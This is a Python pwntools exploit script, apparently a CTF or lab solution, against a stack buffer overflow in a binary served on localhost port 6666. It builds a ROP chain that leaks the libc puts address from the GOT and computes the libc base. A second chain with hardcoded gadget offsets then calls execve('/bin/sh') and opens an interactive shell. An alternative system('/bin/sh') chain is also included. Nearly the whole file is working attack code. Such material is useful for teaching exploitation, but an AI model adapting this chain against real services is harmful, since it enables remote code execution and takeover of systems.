from pwn import *



# 1. get the base address of libc

# call puts(got_puts)
# pop rdi, then puts


# 1. how to get the offset? right now I use gdb
# 2. use libcsearcher to find system and bin/sh
# 3. I don't wanna have 0x0000 in gadget, that's scary. but I still use it.

def leak_libc():
    got_puts = p64(0x601018)
    plt_puts = p64(0x4005c0)
    pop_rdi = p64(0x4008b3)

    chain = pop_rdi + got_puts + plt_puts
    attack = b'a' * 72 + chain
    with open("attack", "wb") as f:
        f.write(attack)
    return attack


# 2. invoke shell by execve('/bin/sh')
# rax: 0x3b
# rdi: &“/bin/sh”
# rsi: 0
# rdx: 0


def shell(base):
    pop_rax = p64(base + 0x4a54f)
    pop_rdi = p64(base + 0x26b72)
    pop_rsi = p64(base + 0x27529)
    mov_rdx_0 = p64(base + 0x142071)    # this will change the value of eax
    syscall = p64(base + 0x02584d)

    # ROPgadget --binary ./libc-2.31.so --string "/bin/sh"
    addr_binsh = p64(base + 0x1b75aa)
    attack = b'a' * 72 + pop_rdi + \
            addr_binsh + pop_rsi + \
            p64(0) + mov_rdx_0 + \
            pop_rax + p64(0x3b) + syscall
    return attack



def shell_system(base):
    """
    system('/bin/sh')
    this doesn't work for this case because stack operations will be beyond the
    process. If the vulnerability is deeper, this may work.
    """
    pop_rdi = p64(base + 0x26b72)
    addr_binsh = p64(base + 0x1b75aa)

    # objdump -T libc-2.31.so | grep system
    system = p64(base + 0x55410)

    padding = b'a' * 72

    attack = padding + pop_rdi + addr_binsh + system
    with open("attack", "wb") as f:
        f.write(attack)
    return attack

def main():
    attack = leak_libc()
    # p = process("./stack", env = {"LD_PRELOAD": "./ld-2.31.so ./libc-2.31.so"})
    p = connect("localhost", 6666)
    print(p.recvline())
    p.sendline(attack)
    print(p.recvline())
    addr = p.recvline()
    addr = addr.strip()
    print(addr)
    addr = int.from_bytes(addr, "little")

    base = addr + 0x7ffff7be3000 - 0x00007ffff7c6a5a0

    print("puts: 0x%x, base: 0x%x" % (addr, base))

    # p = process("./stack", env = {"LD_PRELOAD": "./ld-2.31.so ./libc-2.31.so"})
    p = connect("localhost", 6666)
    input()
    attack = shell(base)
    p.sendline(attack)
    print(p.recvline())
    p.interactive()

if __name__ == "__main__":
    main()
